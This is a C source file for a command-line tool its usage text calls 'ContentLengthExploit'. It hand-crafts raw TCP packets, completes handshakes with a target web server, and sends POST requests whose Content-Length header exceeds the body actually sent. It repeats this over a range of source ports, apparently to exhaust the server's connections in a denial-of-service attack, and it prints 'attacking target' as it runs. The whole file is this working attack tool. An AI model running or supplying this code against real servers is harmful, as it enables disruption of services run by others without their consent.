#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <locale.h>
#include <netdb.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>

#define MAX_PAYLOAD 16384
#define DWORD int
#define BOOL int
#define SOCKET int
#define _tprintf printf

#define TRUE 1
#define FALSE 0
#define _T(s) s

#ifdef DEBUG
#define TRACE(a) fprintf(stderr, a)
#else
#define TRACE(a)
#endif

#define __min(a,b) (((a)<(b))?(a):(b))

typedef struct addrinfo ADDRINFOT;

//static const char *sNodeName = _T ("192.168.137.129");
//static const char *sServiceName = _T ("80");

static char sNodeName[256];
static char sServiceName[256];
static char sUrl[1024];
static unsigned short nTargetPort;
static unsigned int nCount;
static unsigned short nFirstPort = 2000;

static const char *sRequestTemplate = _T("POST /%s HTTP/1.1\n")
    _T("Host: %s:%d\n")
    _T("Connection: keep-alive\n")
    _T("Content-Length: %d\n") _T("\n") _T("hello, world\n");

#define CLEAN_UP_AND_EXIT(v) do { \
        main_result = v; \
        goto CleanUpAndFinish; \
        } while (0);

typedef struct __ipheader {
	unsigned char ip_hl: 4, ip_ver: 4;
	unsigned char ip_tos;
	unsigned short int ip_len;
	unsigned short int ip_id;
	unsigned short int ip_off;
	unsigned char ip_ttl;
	unsigned char ip_p;
	unsigned short int ip_csum;
	unsigned int ip_src;
	unsigned int ip_dst;
} ipheader;

typedef struct __tcpheader {
	unsigned short int th_sport;
	unsigned short int th_dport;
	unsigned int th_seq;
	unsigned int th_ack;
	unsigned char th_x2: 4, th_off: 4;
	//unsigned char th_x2_off;
	unsigned char th_flags;
	unsigned short int th_win;
	unsigned short int th_sum;
	unsigned short int th_urp;
} tcpheader;

typedef struct __pseudoheader {
	unsigned long ps_src;
	unsigned long ps_dst;
	char useless;
	unsigned char ps_proto;
	unsigned short ps_len;
} pseudoheader;

#define TH_FIN 0x01
#define TH_SYN 0x02
#define TH_RST 0x04
#define TH_PUSH 0x08
#define TH_ACK 0x10
#define TH_URG 0x20
#define TH_ECE 0x40
#define TH_CWR 0x80

typedef struct __tcpstate {
	unsigned int seq;
	unsigned int ack;
	unsigned short int win;

	const struct sockaddr_in *src;
	const struct sockaddr_in *dst;
} tcpstate;

unsigned short
chksum(const ipheader * hdrIp, const tcpheader * hdrTcp, unsigned short *data,
       int size)
{
	int nleft;
	const unsigned short *w;
	const unsigned short *src = (const unsigned short *)&hdrIp->ip_src;
	const unsigned short *dst = (const unsigned short *)&hdrIp->ip_dst;
	unsigned short len_tcp = hdrTcp->th_off * 4 + size;
	const unsigned short *buff = (const unsigned short *)hdrTcp;
	unsigned long cksum =
	    (src[0]) + (src[1]) +
	    (dst[0]) + (dst[1]) + htons(IPPROTO_TCP) + htons(len_tcp);

	nleft = len_tcp;
	w = buff;
	while (nleft > 1) {
		cksum += *w++;
		nleft -= 2;
	}
	if (nleft > 0) {
		cksum += *w & ntohs(0xff00);
	}

	cksum = (cksum >> 16) + (cksum & 0xffff);
	cksum += (cksum >> 16);
	return (unsigned short)(~cksum);
}

size_t
prepare_packet(const tcpstate * const s,
	       unsigned char tcp_flags,
	       const char *payload,
	       size_t payload_length, char *pBuffer, size_t nBufferSize)
{

	ipheader *hdrIp = (ipheader *) pBuffer;
	tcpheader *hdrTcp = (tcpheader *) (pBuffer + sizeof(ipheader));
	char *pData = pBuffer + sizeof(ipheader) + sizeof(tcpheader);

	if (nBufferSize < sizeof(ipheader) + sizeof(tcpheader) + payload_length) {
		_tprintf(_T("buffer size %d to small in prepare_packet()\n"),
			 nBufferSize);
		exit(1);
	}

	hdrIp->ip_ver = 4;
	hdrIp->ip_hl = 5;
	hdrIp->ip_tos = 0;
	hdrIp->ip_len =
	    htons(sizeof(ipheader) + sizeof(tcpheader) + payload_length);
	hdrIp->ip_id = rand();
	hdrIp->ip_off = 0;
	hdrIp->ip_ttl = 128;
	hdrIp->ip_p = 6;
	hdrIp->ip_csum = 0;	// let the ip stack generate the checksum
	hdrIp->ip_src = s->src->sin_addr.s_addr;
	hdrIp->ip_dst = s->dst->sin_addr.s_addr;

	hdrTcp->th_sport = s->src->sin_port;
	hdrTcp->th_dport = s->dst->sin_port;
	hdrTcp->th_seq = htonl(s->seq);
	hdrTcp->th_ack = htonl(s->ack);
	hdrTcp->th_x2 = 0;
	hdrTcp->th_off = (sizeof(tcpheader)) / 4;
	hdrTcp->th_flags = tcp_flags;
	hdrTcp->th_win = htons(s->win);
	hdrTcp->th_urp = 0;

	if (payload != NULL) {
		memcpy(pData, payload, payload_length);
	}
	hdrTcp->th_sum = 0;
	hdrTcp->th_sum =
	    chksum(hdrIp, hdrTcp, (unsigned short *)payload, payload_length);

	return sizeof(ipheader) + sizeof(tcpheader) + payload_length;
}

/*
* Returns the local ip address.
*
* This functions opens a connection to the target host
* and returns the ip address that was used to open the connection,
* which is useful if we are multi homed
*/
BOOL get_my_ip(const struct sockaddr_in *const target, struct in_addr *addr)
{
	SOCKET fd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	struct sockaddr_in self;
	int namelen = sizeof(self);
	if (0 != connect(fd, (struct sockaddr *)target, sizeof(*target))) {
		perror("unable to connect()");
		return FALSE;
	}
	memset(&self, 0, sizeof(self));
	if (0 != getsockname(fd, (struct sockaddr *)&self, &namelen)) {
		perror("error while running getsockname()");
		close(fd);
		return FALSE;
	}
	*addr = self.sin_addr;
	close(fd);
	return TRUE;
}

unsigned int get_isn()
{
	return (unsigned int)rand();
}

const char *get_post_request(const char *sUrl, const char *sServer,
			     unsigned short nPort, unsigned int nContentLength)
{
	static char sBuffer[1024];
	snprintf(sBuffer, sizeof(sBuffer) / sizeof(sBuffer[0]) - 1,
		 sRequestTemplate, sUrl, sServer, nPort, nContentLength);
	return sBuffer;
}

BOOL send_SYN(SOCKET rawfd, tcpstate * s)
{
	TRACE(_T("entering send_SYN()\n"));
	char pBuffer[sizeof(ipheader) + sizeof(tcpheader) + 1024];
	size_t length =
	    prepare_packet(s, TH_SYN, NULL, 0, pBuffer, sizeof(pBuffer));

	if (-1 ==
	    sendto(rawfd, pBuffer, length, 0, (const struct sockaddr *)s->dst,
		   sizeof(*(s->dst)))) {
		perror("sendto() failed in send_SYN() with error:");
		return FALSE;
	}
	s->seq++;		// TH_SYN counts as 1
	TRACE(_T("send_SYN() succeeded\n"));
	return TRUE;
}

BOOL packet_matches_state(const ipheader * hdrIp, const tcpheader * hdrTcp,
			  const tcpstate * s, unsigned short desiredFlags)
{
	fprintf(stderr, "received a packet from %d to %d ...\n",
		ntohs(hdrTcp->th_sport), ntohs(hdrTcp->th_dport));

	if (hdrIp->ip_src != s->dst->sin_addr.s_addr) {
		printf("packet comes from address: %s\n",
		       (char *)inet_ntoa(hdrIp->ip_src));
		return FALSE;
	}
	if (hdrIp->ip_dst != s->src->sin_addr.s_addr) {
		printf("packet goes to address:    %s\n",
		       (char *)inet_ntoa(hdrIp->ip_dst));
		return FALSE;
	}
	if (hdrTcp->th_sport != s->dst->sin_port) {
		printf("packet comes from port:    %d\n",
		       ntohs(hdrTcp->th_sport));
		return FALSE;
	}
	if (hdrTcp->th_dport != s->src->sin_port) {
		printf("packet goes to port:       %d\n",
		       ntohs(hdrTcp->th_dport));
		return FALSE;
	}
	if ((hdrTcp->th_flags & desiredFlags) == 0) {
		printf("the following flags are set: %d\n", hdrTcp->th_flags);
		return FALSE;
	}
	return TRUE;
}

BOOL recv_SYNACK(SOCKET rawfd, tcpstate * s)
{
	TRACE(_T("entering recv_SYNACK()\n"));
	unsigned char pBuffer[4096];
	ipheader *hdrIp = (ipheader *) pBuffer;
	tcpheader *hdrTcp = NULL;
	ssize_t length;

	struct sockaddr_in from = *(s->dst);
	socklen_t fromlen = sizeof(from);

	do {
		memset(pBuffer, 0, sizeof(pBuffer));
		if (-1 ==
		    (length = recvfrom(rawfd, pBuffer, sizeof(pBuffer), 0,
				       (struct sockaddr *)&from, &fromlen))) {
			perror("recvfrom() failed in recv_SYNACK() with error");
			return FALSE;
		}

		hdrTcp = (tcpheader *) (pBuffer + hdrIp->ip_hl * 4);
	} while (!packet_matches_state(hdrIp, hdrTcp, s, TH_SYN | TH_ACK));

	if (ntohl(hdrTcp->th_ack) != s->seq) {
		printf("invalid acknowledgement number: %d (0x%08x)\n",
		       ntohl(hdrTcp->th_ack), ntohl(hdrTcp->th_ack));
		return FALSE;
	}
	s->win = ntohs(hdrTcp->th_win);
	s->ack = ntohl(hdrTcp->th_seq) + 1;	// TH_SYN counts as 1
	TRACE(_T("recv_SYNACK() succeeded\n"));
	return TRUE;
}

BOOL send_ACK(SOCKET rawfd, tcpstate * s)
{
	TRACE(_T("entering send_ACK()\n"));
	char pBuffer[sizeof(ipheader) + sizeof(tcpheader) + 1024];
	size_t length =
	    prepare_packet(s, TH_ACK, NULL, 0, pBuffer, sizeof(pBuffer));

	if (-1 ==
	    sendto(rawfd, pBuffer, length, 0, (const struct sockaddr *)s->dst,
		   sizeof(*(s->dst)))) {
		perror("sendto() failed in send_ACK() with error:");
		return FALSE;
	}
	TRACE(_T("send_ACK() succeeded\n"));
	return TRUE;
}

BOOL recv_ACK(SOCKET rawfd, tcpstate * s)
{
	TRACE(_T("entering recv_ACK()\n"));
	unsigned char pBuffer[4096];
	ipheader *hdrIp = (ipheader *) pBuffer;
	tcpheader *hdrTcp = NULL;
	ssize_t length;

	struct sockaddr_in from = *(s->dst);
	socklen_t fromlen = sizeof(from);

	do {
		memset(pBuffer, 0, sizeof(pBuffer));
		if (-1 ==
		    (length = recvfrom(rawfd, pBuffer, sizeof(pBuffer), 0,
				       (struct sockaddr *)&from, &fromlen))) {
			perror("recvfrom() failed in recv_SYNACK() with error");
			return FALSE;
		}

		hdrTcp = (tcpheader *) (pBuffer + hdrIp->ip_hl * 4);
	} while (!packet_matches_state(hdrIp, hdrTcp, s, TH_ACK));

	if (ntohl(hdrTcp->th_ack) != s->seq) {
		printf("invalid acknowledgement number: %d (0x%08x)\n",
		       ntohl(hdrTcp->th_ack), ntohl(hdrTcp->th_ack));
		return FALSE;
	}
	s->win = ntohs(hdrTcp->th_win);
	s->ack = ntohl(hdrTcp->th_seq) + 1;	// TH_ACK counts as 1
	TRACE(_T("recv_ACK() succeeded\n"));
	return TRUE;
}

BOOL send_segment(SOCKET rawfd, tcpstate * s)
{
	return TRUE;
}

BOOL send_data(SOCKET rawfd, tcpstate * s)
{
	TRACE(_T("entering recv_ACK()\n"));
	char pBuffer[1492 + 1024];
	const char *ptr = get_post_request(sUrl, sNodeName, nTargetPort, 2000);
	size_t nBufferSize = s->win + sizeof(tcpheader);
	int nBytesToSend = strlen(ptr);

	while (nBytesToSend > 0) {
		// prevent buffer overflow
		int payload_length = __min(s->win,
					   sizeof(pBuffer) - (sizeof(ipheader) +
							      sizeof
							      (tcpheader)));

		// don't send more bytes than available
		payload_length = __min(payload_length, nBytesToSend);

		int length =
		    prepare_packet(s, TH_ACK, ptr, payload_length, pBuffer,
				   sizeof(pBuffer));

		if (-1 ==
		    sendto(rawfd, pBuffer, length, 0,
			   (const struct sockaddr *)s->dst,
			   sizeof(*(s->dst)))) {
			perror
			    ("sendto() failed in send_data() with error: %s\n");
			return FALSE;
		}
		ptr += payload_length;
		nBytesToSend -= payload_length;

		if (nBytesToSend > 0) {
			if (TRUE != recv_ACK(rawfd, s))
				return FALSE;
		}
	}
	TRACE(_T("send_data() succeeded\n"));
}

void exploit(const struct sockaddr_in *target, const struct sockaddr_in *src)
{
	tcpstate s;
	DWORD val = TRUE;

	memset(&s, 0, sizeof(s));

	SOCKET rawfd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
	if (rawfd == -1) {
		perror("socket() failed with error");
		return;
	}
	if (-1 == bind(rawfd, (struct sockaddr *)src, sizeof(*src))) {
		perror("bind() failed with error");
		return;
	}
	if (-1 ==
	    setsockopt(rawfd, IPPROTO_IP, IP_HDRINCL, (char *)&val,
		       sizeof(val))) {
		perror("setsockopt() failed with error");
		return;
	}

	s.seq = get_isn();
	s.src = src;
	s.dst = target;
	s.win = 32792;
	printf("Using IP address %s to exploit the target at ",
	       (char *)inet_ntoa(s.src->sin_addr));
	printf("%s\n", (char *)inet_ntoa(target->sin_addr));

	if (FALSE == send_SYN(rawfd, &s))
		return;

	if (FALSE == recv_SYNACK(rawfd, &s))
		return;

	if (FALSE == send_ACK(rawfd, &s))
		return;

	send_data(rawfd, &s);
}

void usage()
{
	printf
	    ("Usage: ContentLengthExploit <hostname> <port> <url> <count>\n\n");
}

void parse_cmdline(int argc, char *argv[])
{
	strncpy(sNodeName, argv[1], sizeof(sNodeName) - sizeof(sNodeName[0]));
	nTargetPort = (unsigned short)atoi(argv[2]);
	strncpy(sUrl, argv[3], sizeof(sUrl) - sizeof(sUrl[0]));
	nCount = (unsigned int)atoi(argv[4]);
}

int main(int argc, char *argv[])
{
	int main_result = 0;
	int port;
	DWORD dwResult;
	ADDRINFOT hints;
	ADDRINFOT *result = NULL;
	ADDRINFOT *ptr = NULL;
	struct sockaddr_in *target = NULL;
	struct sockaddr_in src;

	if (argc < 5) {
		usage();
		CLEAN_UP_AND_EXIT(1);
	}
	parse_cmdline(argc, argv);

	srand(0);
	// resolve node name
	memset(&hints, 0, sizeof(hints));
	dwResult = getaddrinfo(sNodeName, sServiceName, &hints, &result);
	if (dwResult != 0) {
		_tprintf(_T("GetAddrInfo failed with error: %s\n"),
			 gai_strerror(dwResult));
		CLEAN_UP_AND_EXIT(2);
	}
	for (ptr = result; ptr != NULL && target == NULL; ptr = ptr->ai_next) {
		switch (ptr->ai_family) {
		case AF_INET:
			target = (struct sockaddr_in *)ptr->ai_addr;
		}
	}
	if (target == NULL) {
		_tprintf(_T("No usable address found :-(\n"));
		CLEAN_UP_AND_EXIT(3);
	}
	target->sin_port = htons(nTargetPort);
	fprintf(stderr, "attacking target %s:%d\n",
		(char *)inet_ntoa(target->sin_addr), ntohs(target->sin_port));
	memset(&src, 0, sizeof(src));
	if (!get_my_ip(target, &src.sin_addr)) {
		_tprintf(_T("Unable to determine local IP address\n"));
		return -1;
	}
	for (port = nFirstPort; port < nFirstPort + nCount; port++) {
		src.sin_port = htons(port);
		exploit(target, &src);
	}
 CleanUpAndFinish:
	return main_result;
}
